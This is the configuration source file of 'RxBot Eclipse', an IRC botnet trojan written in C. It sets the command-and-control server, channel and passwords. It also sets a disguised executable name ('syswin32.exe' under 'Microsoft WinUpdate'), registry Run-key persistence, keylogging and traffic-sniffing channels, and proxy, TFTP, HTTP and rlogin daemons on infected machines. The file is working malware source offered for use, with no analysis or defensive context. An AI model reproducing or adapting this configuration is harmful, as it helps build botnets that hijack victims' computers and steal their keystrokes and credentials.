//

// bot configuration (generic) - doesn't need to be encrypted
int port = 6667;				// server port
int port2 = 6667;				// backup server port
int socks4port = 12221;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 2001;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '.';				// command prefix (one character max.)
int maxrand = 6;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\debug.txt";
#endif

char botid[] = "ec11";						// bot id
char password[] = "3cl1ps30wnzj00";					// bot password
char server[] = "eclipse.rxbot.net";		// server
char serverpass[] = "3cl1ps3";						// server password
char channel[] = "#rxbots";				// channel that the bot should join
char chanpass[] = "eclipse123";						// channel password
char server2[] = "";						// backup server (optional)
char channel2[] = "#";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "syswin32.exe";			// destination file name
char keylogfile[] = "keys.txt";				// keylog filename
char valuename[] = "Microsoft WinUpdate";		// value name for autostart
char nickconst[] = "[EcLiPsE]-";					// first part to the bot's nick
char szLocalPayloadFile[]="msconfig.dat";	// Payload filename
char modeonconn[] = "-x+B";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#exploit";					// Channel where exploit messages get redirected
char psniffchan[] = "#sniff";				  // sniffing channel
char keylogchan[] = "#keylog";						// Channel where keylog messages get redirected
char version[] = "[RxBot-Eclipse1.1.priv]";    // !bot version reply

char *authost[] = {
	"*@*",
};

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";


#ifdef PLAIN_CRYPT
char key[16] = "2poiwsfpf3213ew"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

// RxBot Eclipse V1.0